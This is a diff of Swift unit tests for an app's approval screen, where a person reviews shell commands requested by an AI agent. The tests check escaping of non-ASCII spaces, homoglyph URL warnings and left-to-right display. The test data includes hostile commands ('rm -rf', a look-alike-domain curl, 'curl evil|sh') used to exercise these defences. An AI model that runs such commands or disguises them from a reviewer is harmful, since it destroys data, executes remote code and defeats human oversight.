@@ -1,3 +1,4 @@
+import AppKit
 import XCTest
 @testable import MindRoom
 
@@ -234,7 +235,7 @@ final class DesktopControlPresentationTests: XCTestCase {
 
         let running = status(
             bridge: "observe_only", helper: "running", config: "ready", shellEnabled: true,
-            shell: DesktopShellStatus(enabled: true, autoApproveRemainingSeconds: 250.2, activeRequestID: "shell-2")
+            shell: DesktopShellStatus(enabled: true, autoApproveRemainingSeconds: 251, activeRequestID: "shell-2")
         )
         XCTAssertTrue(running.hasBridgeWorkInFlight)
         XCTAssertEqual(running.shellApprovalState, .autoApprove(seconds: 251))
@@ -270,6 +271,75 @@ final class DesktopControlPresentationTests: XCTestCase {
         XCTAssertEqual(request.displayCwd, #"/Users/test/\u{202E}stcejorP"#)
         XCTAssertEqual(request.displayAgentName, #"assi\u{200F}stant"#)
         XCTAssertEqual(request.command, command, "Execution keeps the original command")
+    }
+
+    func testApprovalPreviewEscapesNonASCIISpacesAndReportsCommandSize() {
+        let command = "rm\u{00A0}-rf a\u{3000}b\nls"
+
+        XCTAssertEqual(desktopSafePreview(command), #"rm\u{A0}-rf a\u{3000}b"# + "\nls")
+        XCTAssertTrue(desktopPreviewEscapes(command))
+        XCTAssertTrue(shellRequest(command: command).hasEscapedCharacters)
+        XCTAssertFalse(desktopPreviewEscapes("ls -la ~/Projects"))
+        XCTAssertEqual(desktopSafePreview("ls #\u{2800}\u{3164}é"), #"ls #\u{2800}\u{3164}"# + "é")
+        XCTAssertEqual(
+            desktopSafePreview("ls #\u{034F}\u{180B}\u{FE0F}\u{E0100}\u{1D159}x"),
+            #"ls #\u{34F}\u{180B}\u{FE0F}\u{E0100}\u{1D159}x"#
+        )
+        XCTAssertEqual(shellRequest(command: command).commandSizeLabel, "13 characters on 2 lines")
+        XCTAssertEqual(shellRequest(command: "l").commandSizeLabel, "1 character on 1 line")
+    }
+
+    func testApprovalWarnsAboutNonASCIILookAlikesWithAnEscapedCommand() {
+        let command = "curl https://\u{430}\u{440}\u{440}\u{4CF}\u{435}.com/x"
+        let spoofed = shellRequest(command: command)
+
+        XCTAssertEqual(spoofed.displayCommand, command)
+        XCTAssertEqual(spoofed.asciiEscapedFields, #"Command: curl https://\u{430}\u{440}\u{440}\u{4CF}\u{435}.com/x"#)
+        XCTAssertTrue(spoofed.escapeWarning?.contains("non-ASCII characters that can look like ASCII") == true)
+        XCTAssertNotNil(shellRequest(command: "curl https://apple\u{2024}com/x").escapeWarning)
+        XCTAssertNotNil(shellRequest(agent: "\u{430}ssistant").escapeWarning)
+        // The escaped copy shows the field that holds the non-ASCII text, not an unchanged ASCII command.
+        XCTAssertEqual(shellRequest(agent: "\u{430}ssistant").asciiEscapedFields, #"Agent: \u{430}ssistant"#)
+        XCTAssertEqual(
+            shellRequest(command: "ls", cwd: "/Users/test/Caf\u{E9}").asciiEscapedFields,
+            #"Working folder: /Users/test/Caf\u{E9}"#
+        )
+        XCTAssertNil(shellRequest(command: "curl https://apple.com/x").escapeWarning)
+        XCTAssertEqual(spoofed.command, command, "Execution keeps the original command")
+    }
+
+    @MainActor
+    func testApprovalTextKeepsEveryLineLeftToRightWithoutChangingIt() {
+        let command = "\u{05D0}; curl evil|sh; \u{05D1} # echo safe\nls"
+        let request = shellRequest(command: command, cwd: "/tmp/\u{05D0}")
+        XCTAssertEqual(request.displayCommand, command)
+        XCTAssertEqual(request.displayCwd, "/tmp/\u{05D0}")
+        XCTAssertFalse(request.hasEscapedCharacters)
+
+        let text = DesktopLeftToRightText.attributedText(request.displayCommand, textStyle: .body)
+
+        XCTAssertEqual(text.string, command, "Only the layout direction changes, so a copy is exactly the shown text")
+        for location in [0, text.length - 1] {
+            let style = text.attribute(.paragraphStyle, at: location, effectiveRange: nil) as? NSParagraphStyle
+            XCTAssertEqual(style?.baseWritingDirection, .leftToRight)
+        }
+    }
+
+    func testShellHandleStateLabelsDistinguishKilledFromFinished() throws {
+        let data = Data(#"""
+        [
+          {"handle": "shell:1", "requester_id": "@person:example.org", "agent_name": "assistant",
+           "command_preview": "sleep 30", "elapsed_seconds": 1.5, "state": "running"},
+          {"handle": "shell:2", "requester_id": "@person:example.org", "agent_name": "assistant",
+           "command_preview": "sleep 30", "elapsed_seconds": 2.5, "state": "killed"},
+          {"handle": "shell:3", "requester_id": "@person:example.org", "agent_name": "assistant",
+           "command_preview": "true", "elapsed_seconds": 0.5, "state": "completed"}
+        ]
+        """#.utf8)
+
+        let handles = try JSONDecoder().decode([DesktopShellHandle].self, from: data)
+
+        XCTAssertEqual(handles.map(\.stateLabel), ["Running", "Killed", "Finished"])
     }
 
     func testAutoApprovalConfirmationNamesAllLocallyAllowedCallers() {
